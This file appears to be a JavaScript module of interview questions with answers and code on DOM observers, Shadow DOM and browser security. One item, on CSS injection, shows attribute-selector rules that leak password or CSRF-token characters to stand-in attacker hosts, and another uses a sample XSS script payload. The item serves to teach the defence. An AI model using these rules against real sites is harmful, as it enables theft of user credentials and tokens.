// scripts/dom-gen/part5-extra.cjs
// 21 Additional Questions for Part 5 (10 INTERMEDIATE, 11 DIFFICULT)
// Total in part5 becomes 75: 10 EASY, 40 INTERMEDIATE, 25 DIFFICULT

module.exports = [
  // --- 10 INTERMEDIATE Questions ---
  {
    topic: "Observers (Mutation, Intersection, Resize)",
    subtopic: "Shared IntersectionObserver Pattern",
    difficulty: "INTERMEDIATE",
    questionType: "PERFORMANCE",
    question: "Why should you use a single shared IntersectionObserver instance rather than creating an observer for every element?",
    shortAnswer: "A single shared observer creates only one internal browser watcher and one callback queue, significantly reducing memory consumption and CPU overhead compared to hundreds of separate observer instances.",
    detailedExplanation: "- **Resource Pooling**: One observer can watch thousands of elements via `observer.observe(target)`.\n- **Target Identification**: Inside the callback, `entry.target` uniquely identifies which specific element intersected.\n- **Clean Teardown**: Calling `observer.disconnect()` clears all tracked elements at once.",
    codeExample: "const sharedLazyObserver = new IntersectionObserver((entries, observer) => {\n  entries.forEach(entry => {\n    if (entry.isIntersecting) {\n      const img = entry.target;\n      img.src = img.dataset.src;\n      observer.unobserve(img); // Unobserves target once loaded\n    }\n  });\n});\n\n// One shared instance observing 500 images:\ndocument.querySelectorAll('img[data-src]').forEach(img => {\n  sharedLazyObserver.observe(img);\n});",
    interviewTips: ["Propose the single shared observer pattern as a key performance optimization for infinite feeds and lazy loaded image galleries."]
  },
  {
    topic: "Observers (Mutation, Intersection, Resize)",
    subtopic: "IntersectionObserverEntry Geometry Properties",
    difficulty: "INTERMEDIATE",
    questionType: "CONCEPTUAL",
    question: "What is the difference between boundingClientRect, intersectionRect, and rootBounds in IntersectionObserverEntry?",
    shortAnswer: "`boundingClientRect` is the full rectangle of the target element; `intersectionRect` is the portion of the target currently visible; `rootBounds` is the rectangle of the viewport or scroll container.",
    detailedExplanation: "- **boundingClientRect**: The target's complete dimensions (`width`, `height`, `top`, `bottom`).\n- **intersectionRect**: The overlapping rectangle where target and root meet (has `width: 0, height: 0` if not intersecting).\n- **rootBounds**: Dimensions of the root container (accounting for `rootMargin`).\n- **Ratio Formula**: `intersectionRatio = intersectionRect area / boundingClientRect area`.",
    codeExample: "const observer = new IntersectionObserver(([entry]) => {\n  console.log('Target total height:', entry.boundingClientRect.height);\n  console.log('Currently visible height:', entry.intersectionRect.height);\n  console.log('Visibility ratio:', entry.intersectionRatio);\n});",
    interviewTips: ["Explain that `intersectionRect` divided by `boundingClientRect` yields `intersectionRatio`."]
  },
  {
    topic: "Observers (Mutation, Intersection, Resize)",
    subtopic: "Lazy Loading Background Images",
    difficulty: "INTERMEDIATE",
    questionType: "CODE",
    question: "How do you lazy load CSS background images using IntersectionObserver?",
    shortAnswer: "Store the image URL in `data-bg` and assign `entry.target.style.backgroundImage = `url(${entry.target.dataset.bg})`` when `entry.isIntersecting` becomes true.",
    detailedExplanation: "- **No HTML Tag**: Background images in CSS download automatically if declared in stylesheets; deferring requires setting them via JS.\n- **Unobserve**: Immediately call `observer.unobserve(entry.target)` after setting the background.\n- **Fade-in**: Add a CSS class for smooth opacity transitions when the background loads.",
    codeExample: "const bgObserver = new IntersectionObserver((entries, observer) => {\n  entries.forEach(entry => {\n    if (entry.isIntersecting) {\n      const el = entry.target;\n      el.style.backgroundImage = `url('${el.dataset.bg}')`;\n      el.classList.add('bg-loaded');\n      observer.unobserve(el);\n    }\n  });\n});\n\ndocument.querySelectorAll('.lazy-bg').forEach(el => bgObserver.observe(el));",
    interviewTips: ["Mention that CSS background images download as soon as CSS rules match, so `data-bg` is required for deferred loading."]
  },
  {
    topic: "Observers (Mutation, Intersection, Resize)",
    subtopic: "Attribute-Only MutationObserver",
    difficulty: "INTERMEDIATE",
    questionType: "CODE",
    question: "How do you configure a MutationObserver to listen strictly to specific attribute changes while ignoring DOM additions?",
    shortAnswer: "Set `attributes: true` and specify the exact attributes in the `attributeFilter: ['class', 'data-status']` array, while setting `childList: false`.",
    detailedExplanation: "- **Selective Filtering**: Prevents callback execution when unmonitored attributes (like `id` or `title`) change.\n- **Performance**: High performance because the browser skips filtering irrelevant DOM mutations.\n- **Previous Values**: Set `attributeOldValue: true` if you need to compare old and new attribute strings.",
    codeExample: "const observer = new MutationObserver((mutations) => {\n  for (const m of mutations) {\n    console.log(`Attribute ${m.attributeName} changed! Old value: ${m.oldValue}`);\n  }\n});\n\nobserver.observe(document.querySelector('#profile-card'), {\n  attributes: true,\n  attributeFilter: ['data-theme', 'class'],\n  attributeOldValue: true\n});",
    interviewTips: ["Emphasize `attributeFilter` and `attributeOldValue: true` for surgical attribute tracking."]
  },
  {
    topic: "Shadow DOM & Web Components",
    subtopic: "attachShadow vs shadowRoot",
    difficulty: "INTERMEDIATE",
    questionType: "COMPARISON",
    question: "What is the difference between element.attachShadow() and element.shadowRoot?",
    shortAnswer: "`attachShadow({ mode })` is the method that creates and attaches a new shadow root to an element; `shadowRoot` is the read-only property used to access that attached shadow root afterward.",
    detailedExplanation: "- **Single Call Only**: Calling `attachShadow()` more than once on the same element throws a `DOMException`.\n- **Unsupported Elements**: Only specific elements can host shadow roots (e.g. custom elements, `<div>`, `<article>`, `<p>`); elements like `<input>` or `<img>` throw errors.\n- **closed Mode**: If attached with `mode: 'closed'`, `element.shadowRoot` returns `null`.",
    codeExample: "const customCard = document.querySelector('custom-card');\n\n// Attaches shadow root (runs once in constructor):\n// const root = customCard.attachShadow({ mode: 'open' });\n\n// Accesses existing shadow root:\nconsole.log(customCard.shadowRoot instanceof ShadowRoot); // true",
    interviewTips: ["Mention that `attachShadow()` can only be called once per element; subsequent calls throw an error."]
  },
  {
    topic: "Shadow DOM & Web Components",
    subtopic: "Passing Complex Data to Web Components",
    difficulty: "INTERMEDIATE",
    questionType: "CONCEPTUAL",
    question: "Why should complex data (arrays, objects) be passed to Web Components via JavaScript properties rather than HTML attributes?",
    shortAnswer: "HTML attributes can only store strings, requiring expensive `JSON.stringify()` and `JSON.parse()` cycles and risking data corruption. JavaScript properties accept raw object references directly.",
    detailedExplanation: "- **String Limitation**: `setAttribute('users', usersArray)` converts the array into `'[object Object]'` unless serialized.\n- **Performance**: Passing 1,000 objects by reference has zero serialization overhead.\n- **Getters & Setters**: Use property getters/setters on the Web Component class to trigger internal re-renders when properties update.",
    codeExample: "class DataTable extends HTMLElement {\n  set items(data) {\n    this._items = data;\n    this.render(); // Re-renders cleanly using raw array reference\n  }\n  get items() {\n    return this._items;\n  }\n}\ncustomElements.define('data-table', DataTable);\n\n// Direct JavaScript property assignment:\nconst table = document.querySelector('data-table');\ntable.items = [{ id: 1, name: 'Alice' }, { id: 2, name: 'Bob' }];",
    interviewTips: ["Rule of thumb: Primitive configs belong in attributes; complex arrays and objects belong in JavaScript properties."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Native HTML Escaping Function",
    difficulty: "INTERMEDIATE",
    questionType: "CODE",
    question: "How do you write a lightweight, foolproof function to escape HTML special characters in JavaScript without regex?",
    shortAnswer: "Create a detached `<div>` in memory, assign the string to its `textContent`, and return its `innerHTML`.",
    detailedExplanation: "- **Browser Native Escaping**: Leverages the browser engine's C++ parser to escape `&`, `<`, `>`, `\"`, and `'` perfectly.\n- **Zero External Dependencies**: Works in any browser environment with zero library weight.\n- **In-Memory Safety**: Because the div is never attached to the document, no visual reflow or script execution can occur.",
    codeExample: "function escapeHtml(string) {\n  const div = document.createElement('div');\n  div.textContent = string; // Engine escapes characters automatically\n  return div.innerHTML;    // Returns escaped entities like &lt; &gt; &amp;\n}\n\nconsole.log(escapeHtml('<script>alert(\"XSS\")</script>'));\n// '&lt;script&gt;alert(\"XSS\")&lt;/script&gt;'",
    interviewTips: ["Highlight this 'createElement div textContent -> innerHTML' trick as an elegant interview solution for HTML escaping."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "CSP style-src and DOM element.style",
    difficulty: "INTERMEDIATE",
    questionType: "SECURITY",
    question: "How does Content-Security-Policy style-src affect JavaScript inline style modifications?",
    shortAnswer: "Setting `style-src 'self'` blocks raw `<style>` tags and HTML `style=\"...\"` attributes, but direct JavaScript property assignments like `element.style.color = 'blue'` are allowed because they modify the CSSOM directly.",
    detailedExplanation: "- **String vs CSSOM**: CSP blocks string parsing of inline style blocks (`style=\"...\"`), but allows programmatic CSSOM manipulation via `element.style.setProperty()`.\n- **style-src 'unsafe-inline'**: Required if third-party libraries inject raw CSS strings via `element.setAttribute('style', '...')`.\n- **Nonce for Styles**: `<style nonce=\"...\">` allows secure static stylesheets without allowing arbitrary inline styles.",
    codeExample: "// Allowed under strict CSP style-src (direct CSSOM mutation):\nelement.style.color = '#10b981';\nelement.style.setProperty('font-size', '16px');\n\n// BLOCKED under strict CSP (triggers string attribute parsing):\n// element.setAttribute('style', 'color: #10b981; font-size: 16px;');",
    interviewTips: ["Distinguish between `element.style.color = ...` (CSSOM mutation, allowed) and `element.setAttribute('style', ...)` (blocked by strict CSP)."]
  },
  {
    topic: "Shadow DOM & Web Components",
    subtopic: "Autonomous vs Template Wrappers",
    difficulty: "INTERMEDIATE",
    questionType: "CONCEPTUAL",
    question: "What is the difference between an Autonomous Custom Element and an HTML5 Template wrapper?",
    shortAnswer: "An autonomous custom element has custom tag semantics, JavaScript lifecycle callbacks, and encapsulated behavior; an HTML5 template is an inert storage container that only activates when cloned into the DOM.",
    detailedExplanation: "- **Autonomous Custom Element**: Full citizen of the DOM with interactive lifecycle hooks (`connectedCallback`, `attributeChangedCallback`).\n- **HTML5 `<template>`**: Passive container holding inert nodes (`content.cloneNode(true)`) with no behavior or lifecycle.\n- **Combination**: Best practice is to use `<template>` inside custom element definitions for fast, efficient DOM cloning.",
    codeExample: "const template = document.createElement('template');\ntemplate.innerHTML = `<style>.card { padding: 16px; }</style><div class=\"card\"><slot></slot></div>`;\n\nclass CustomCard extends HTMLElement {\n  constructor() {\n    super();\n    this.attachShadow({ mode: 'open' });\n    // Combines custom element lifecycle with template cloning:\n    this.shadowRoot.appendChild(template.content.cloneNode(true));\n  }\n}\ncustomElements.define('custom-card', CustomCard);",
    interviewTips: ["Show how templates and custom elements complement each other: templates store the HTML; custom elements provide the lifecycle."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "innerText vs textContent Security Nuances",
    difficulty: "INTERMEDIATE",
    questionType: "COMPARISON",
    question: "Why is textContent preferred over innerText from both a security and performance standpoint?",
    shortAnswer: "`textContent` retrieves and writes raw text without triggering reflow, while `innerText` forces synchronous layout calculation to evaluate CSS visibility (`display: none`) and can execute layout-sensitive mutations.",
    detailedExplanation: "- **Performance**: `innerText` is layout-aware; reading it forces a reflow to compute if elements are hidden by CSS. `textContent` reads the DOM tree directly without reflow.\n- **Script Nodes**: `textContent` returns text inside `<script>` and `<style>` tags; `innerText` excludes hidden tags.\n- **Consistency**: `textContent` behavior is standardized across all engines, while `innerText` historic implementations varied.",
    codeExample: "const box = document.querySelector('#content');\n\n// Fast & Safe (no reflow, standard C++ text write):\nbox.textContent = userMessage;\n\n// Slower (forces synchronous layout check):\n// box.innerText = userMessage;",
    interviewTips: ["Always prefer `textContent`: it bypasses layout reflows and provides predictable, standard text handling."]
  },

  // --- 11 DIFFICULT Questions ---
  {
    topic: "Observers (Mutation, Intersection, Resize)",
    subtopic: "ResizeObserver and CSS Container Queries",
    difficulty: "DIFFICULT",
    questionType: "COMPARISON",
    question: "When should you use modern CSS Container Queries (@container) instead of JavaScript ResizeObserver?",
    shortAnswer: "Use CSS Container Queries for purely visual, styling, and layout responsiveness based on container size; use ResizeObserver when JavaScript logic (like re-rendering canvas charts or virtual list recalculations) is required.",
    detailedExplanation: "- **CSS Engine Optimization**: CSS `@container (min-width: 400px)` runs directly inside the browser's C++ style engine without main-thread JavaScript execution.\n- **Zero Script Overhead**: Eliminates JavaScript observer callbacks, rAF debounces, and class toggling.\n- **When JS is Still Needed**: ResizeObserver remains mandatory for Canvas resizing, WebGL redraws, SVG re-computations, and pagination sizing.",
    codeExample: "/* Modern CSS Container Query (No JavaScript ResizeObserver needed!): */\n.card-container {\n  container-type: inline-size;\n}\n\n@container (min-width: 500px) {\n  .card {\n    display: grid;\n    grid-template-columns: 200px 1fr;\n  }\n}",
    interviewTips: ["State that CSS container queries have replaced ResizeObserver for 90% of responsive UI layout needs."]
  },
  {
    topic: "Observers (Mutation, Intersection, Resize)",
    subtopic: "MutationObserver Across Closed Shadow Roots",
    difficulty: "DIFFICULT",
    questionType: "CONCEPTUAL",
    question: "Can a MutationObserver attached to the document root observe mutations occurring inside a component's Shadow Root?",
    shortAnswer: "No, MutationObserver traversal stops at Shadow DOM boundaries; mutations occurring inside a shadow root (open or closed) will NOT be reported to an observer watching the document root.",
    detailedExplanation: "- **Encapsulation Boundary**: Shadow roots are separate document fragments disconnected from the outer document tree.\n- **Observing Internals**: You must explicitly call `observer.observe(customEl.shadowRoot, ...)` on the shadow root itself.\n- **Closed Shadow Barrier**: For `mode: 'closed'`, outer scripts cannot access the shadow root, making it impossible to attach an observer from the outside.",
    codeExample: "const observer = new MutationObserver((mutations) => {\n  console.log('Document mutation'); // NEVER triggers for mutations inside shadow DOM!\n});\nobserver.observe(document.body, { childList: true, subtree: true });",
    interviewTips: ["Emphasize that `subtree: true` on the document does NOT penetrate into Shadow Roots."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "CSS Injection Token Exfiltration Attacks",
    difficulty: "DIFFICULT",
    questionType: "SECURITY",
    question: "How can CSS injection in the DOM be used by attackers to steal sensitive user inputs or CSRF tokens without JavaScript?",
    shortAnswer: "Attackers use CSS attribute selectors with background image URLs (e.g. `input[value^='a'] { background: url('//evil.com?c=a') }`) to sequentially exfiltrate user keystrokes to an attacker's server.",
    detailedExplanation: "- **Attribute Selectors**: `input[name=\"csrf\"][value^=\"A\"]` tests if the token starts with 'A'. If true, the browser fetches the background image from the attacker's server.\n- **Recursive Exfiltration**: By combining multiple rules, the attacker reconstructs the token character by character.\n- **Defense**: Restrict dynamic CSS injection, sanitize user-generated stylesheets, and deploy strict CSP `style-src`.",
    codeExample: "/* Concept of CSS Attribute Exfiltration: */\n/* input[type=\"password\"][value^=\"p\"] { background-image: url(\"https://attacker.com/leak?char=p\"); } */\n/* input[type=\"password\"][value^=\"pa\"] { background-image: url(\"https://attacker.com/leak?char=a\"); } */",
    interviewTips: ["Mention CSS attribute selector token exfiltration as proof that CSS injection is a genuine security threat."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Cross-Origin Iframe DOM Same-Origin Policy",
    difficulty: "DIFFICULT",
    questionType: "SECURITY",
    question: "What happens when JavaScript attempts to access the DOM of a cross-origin iframe (iframe.contentDocument)?",
    shortAnswer: "The browser throws a SecurityError (DOMException) under the Same-Origin Policy, blocking all reading and writing of elements, cookies, and URLs inside cross-origin iframes.",
    detailedExplanation: "- **Same-Origin Boundary**: Protocol, domain, and port must match exactly.\n- **Accessible Properties**: Only `window.postMessage`, `window.location.replace` (write-only), and `window.frames.length` are accessible.\n- **Document Access**: `iframe.contentDocument` returns `null` or throws an error.\n- **Safe Communication**: Use `window.postMessage(data, targetOrigin)` with strict origin verification.",
    codeExample: "const iframe = document.querySelector('#partner-frame');\n\ntry {\n  // Throws DOMException: Blocked a frame with origin from accessing a cross-origin frame:\n  const secret = iframe.contentDocument.querySelector('#token').value;\n} catch (err) {\n  console.warn('Cross-origin DOM access correctly blocked by Same-Origin Policy:', err);\n}",
    interviewTips: ["List the three elements of an origin: protocol, domain, and port. All three must match for DOM access."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "JSON Vulnerability Prefixes (XSSI Protection)",
    difficulty: "DIFFICULT",
    questionType: "SECURITY",
    question: "Why do APIs from Google and Facebook prefix JSON responses with )]}',\\n before sending them to the client?",
    shortAnswer: "It prevents Cross-Site Script Inclusion (XSSI) attacks: if an attacker tries to include the API endpoint via a `<script src=\"...\">` tag, the prefix triggers a syntax error immediately, preventing the JSON data from being read.",
    detailedExplanation: "- **XSSI Mechanism**: Ancient browsers allowed overriding `Array` constructors to steal JSON arrays loaded via `<script src=\"/api/user\">`.\n- **Prefix Defense**: The prefix `)]}',\\n` makes the response invalid JavaScript syntax, causing `<script>` execution to abort with an error.\n- **Client Strip**: Valid AJAX/Fetch clients strip the prefix (`response.text().then(t => JSON.parse(t.replace(/^\\)\\]}',\\n/, ''))`) before parsing.",
    codeExample: "// Client-side handling of secure prefixed JSON responses:\nasync function fetchSecureData(url) {\n  const res = await fetch(url);\n  let raw = await res.text();\n  // Strips security prefix before parsing JSON:\n  raw = raw.replace(/^\\)\\]}',\\n/, '');\n  return JSON.parse(raw);\n}",
    interviewTips: ["Cite the `)]}',\\n` prefix as standard defense-in-depth against Cross-Site Script Inclusion (XSSI)."]
  },
  {
    topic: "Shadow DOM & Web Components",
    subtopic: "Micro-Frontend Encapsulation via Shadow DOM",
    difficulty: "DIFFICULT",
    questionType: "ARCHITECTURE",
    question: "How does Shadow DOM provide architectural boundaries for Micro-Frontend applications?",
    shortAnswer: "Shadow DOM provides complete CSS isolation and DOM scoping, allowing different teams to deploy independent micro-frontends with conflicting CSS classes or framework versions on the same page without style collisions.",
    detailedExplanation: "- **CSS Isolation**: Global styles in one micro-frontend cannot leak into or break sibling micro-frontends.\n- **Event Retargeting**: Normalizes events so container apps only see interactions from the component root.\n- **Lifecycle Sandboxing**: Each micro-frontend wraps its mounting and unmounting logic within `connectedCallback` and `disconnectedCallback`.",
    codeExample: "class TeamAMicroFrontend extends HTMLElement {\n  connectedCallback() {\n    const shadow = this.attachShadow({ mode: 'open' });\n    // Mounts isolated React/Vue app inside shadow DOM:\n    this.appInstance = mountTeamAApp(shadow);\n  }\n  disconnectedCallback() {\n    this.appInstance?.unmount();\n  }\n}\ncustomElements.define('team-a-app', TeamAMicroFrontend);",
    interviewTips: ["Mention Shadow DOM as a core architectural building block for resilient multi-team micro-frontends."]
  },
  {
    topic: "Observers (Mutation, Intersection, Resize)",
    subtopic: "IntersectionObserver with CSS 3D Transforms",
    difficulty: "DIFFICULT",
    questionType: "CONCEPTUAL",
    question: "How does IntersectionObserver compute intersection ratios when elements are transformed with 3D rotations or scales?",
    shortAnswer: "IntersectionObserver calculates the 2D axis-aligned bounding box of the transformed element in the viewport's coordinate space, projecting the 3D transformed bounds onto a 2D plane.",
    detailedExplanation: "- **Axis-Aligned Bounding Box (AABB)**: If an element is rotated by 45 degrees, the observer bounds are calculated from the smallest non-rotated rectangle enclosing the rotated element.\n- **intersectionRatio Impact**: Because the AABB is larger than the original unrotated element area, the reported `intersectionRatio` may not match simple visual intuitions.\n- **Invisible Planes**: If scaled to `scale(0)` or rotated 90 degrees edge-on, `isIntersecting` evaluates to `false`.",
    codeExample: "/* Rotated element produces an expanded 2D axis-aligned bounding box: */\n.tilted-banner {\n  transform: rotate(45deg);\n}",
    interviewTips: ["Mention that browsers project 3D transforms onto 2D Axis-Aligned Bounding Boxes (AABB) for intersection calculations."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Secure Cookie DOM Attributes (SameSite, Secure, HttpOnly)",
    difficulty: "DIFFICULT",
    questionType: "SECURITY",
    question: "How do document.cookie limitations mandate using server-set HttpOnly, Secure, and SameSite cookie flags?",
    shortAnswer: "JavaScript `document.cookie` cannot set the `HttpOnly` flag. If sensitive session cookies lack `HttpOnly`, any DOM XSS payload can immediately read and exfiltrate them via `document.cookie`.",
    detailedExplanation: "- **HttpOnly Flag**: Can only be set by the server via `Set-Cookie` headers; completely hides the cookie from client JavaScript `document.cookie`.\n- **SameSite=Strict/Lax**: Prevents the browser from sending cookies on cross-origin requests, neutralizing CSRF attacks.\n- **Secure Flag**: Ensures cookies are transmitted only over encrypted HTTPS connections.\n- **document.cookie Scope**: Should only ever be used for non-sensitive UI preferences (like light/dark mode).",
    codeExample: "// In client JavaScript, reading document.cookie only reveals non-HttpOnly cookies:\nconsole.log(document.cookie); // \"theme=dark; consent=true\" (Auth token is invisible!)",
    interviewTips: ["Emphasize that `HttpOnly` cannot be set by client-side JavaScript—it is strictly a server-controlled security barrier."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "DOM Clobbering Mitigation with Object.prototype",
    difficulty: "DIFFICULT",
    questionType: "SECURITY",
    question: "How do you protect JavaScript utility libraries from DOM Clobbering when checking object properties?",
    shortAnswer: "Always invoke methods from the prototype directly (e.g. `Object.prototype.hasOwnProperty.call(obj, prop)`) instead of `obj.hasOwnProperty(prop)`, because an injected HTML input can clobber the property.",
    detailedExplanation: "- **The Trap**: If an object represents form elements or window properties, an attacker's `<input id=\"hasOwnProperty\">` replaces the function with an HTMLInputElement.\n- **Safe Invocation**: Calling from the prototype guarantees execution of the genuine native function.\n- **Object.hasOwn()**: Modern JavaScript provides `Object.hasOwn(obj, prop)` as a clean, clobber-proof built-in method.",
    codeExample: "const form = document.querySelector('form');\n\n// VULNERABLE if form contains <input name=\"hasOwnProperty\">:\n// form.hasOwnProperty('email'); // TypeError: form.hasOwnProperty is not a function!\n\n// 100% SAFE across all inputs:\nObject.hasOwn(form, 'email');\n// or: Object.prototype.hasOwnProperty.call(form, 'email');",
    interviewTips: ["Recommend `Object.hasOwn()` as modern standard best practice to defeat property clobbering."]
  },
  {
    topic: "Observers (Mutation, Intersection, Resize)",
    subtopic: "Observing Iframe DOM and Cross-Origin Restrictions",
    difficulty: "DIFFICULT",
    questionType: "CODE",
    question: "Can a MutationObserver on the main page observe DOM changes inside an <iframe>?",
    shortAnswer: "Yes, but ONLY if the iframe is strictly Same-Origin (`iframe.contentDocument` is accessible). If the iframe is Cross-Origin, browser security blocks all observer attachment.",
    detailedExplanation: "- **Same-Origin Access**: If origin matches, attach observer directly via `observer.observe(iframe.contentDocument.body, { childList: true, subtree: true })`.\n- **Cross-Origin Barrier**: Accessing `contentDocument` throws a `SecurityError`.\n- **Cross-Origin Bridge**: For cross-origin iframes, the iframe's internal script must run its own MutationObserver and post serialized mutation summaries via `window.postMessage`.",
    codeExample: "const iframe = document.querySelector('#same-origin-frame');\n\niframe.addEventListener('load', () => {\n  try {\n    const iframeDoc = iframe.contentDocument;\n    const observer = new MutationObserver((mutations) => {\n      console.log('Mutation inside same-origin iframe detected!');\n    });\n    observer.observe(iframeDoc.body, { childList: true, subtree: true });\n  } catch (err) {\n    console.warn('Cross-origin iframe DOM cannot be observed:', err);\n  }\n});",
    interviewTips: ["Explain the difference: Same-origin allows direct observer attachment; cross-origin requires `postMessage` relaying."]
  },
  {
    topic: "DOM Security & XSS Prevention",
    subtopic: "Creating Strict Trusted Types HTML Policy",
    difficulty: "DIFFICULT",
    questionType: "CODE",
    question: "How do you implement a strict Trusted Types policy using DOMPurify that rejects unsafe scripts?",
    shortAnswer: "Create a policy via `trustedTypes.createPolicy('dompurify', { createHTML: input => DOMPurify.sanitize(input, { SAFE_FOR_TEMPLATES: true }) })`.",
    detailedExplanation: "- **Enforcement**: Once registered, all assignments to `element.innerHTML` must pass through `policy.createHTML()`.\n- **Auditability**: Security teams can grep the codebase for `createPolicy` to audit all DOM sink mutation sites in one central location.\n- **TypeError Thrown**: Any direct string assignment throws a `TypeError: Failed to set the 'innerHTML' property on 'Element': This document requires 'TrustedHTML' assignment.`",
    codeExample: "let sanitizerPolicy;\n\nif (window.trustedTypes) {\n  sanitizerPolicy = window.trustedTypes.createPolicy('default', {\n    createHTML: (dirty) => DOMPurify.sanitize(dirty),\n    createScript: () => { throw new Error('Inline script generation forbidden'); },\n    createScriptURL: (url) => {\n      if (url.startsWith('https://trusted-cdn.example.com/')) return url;\n      throw new Error('Untrusted script source');\n    }\n  });\n}\n\n// Safe sink mutation:\nconst safeHTML = sanitizerPolicy ? sanitizerPolicy.createHTML(userInput) : DOMPurify.sanitize(userInput);\ncontainer.innerHTML = safeHTML;",
    interviewTips: ["Write out a complete Trusted Types policy implementation to showcase senior-level web security architecture."]
  }
];
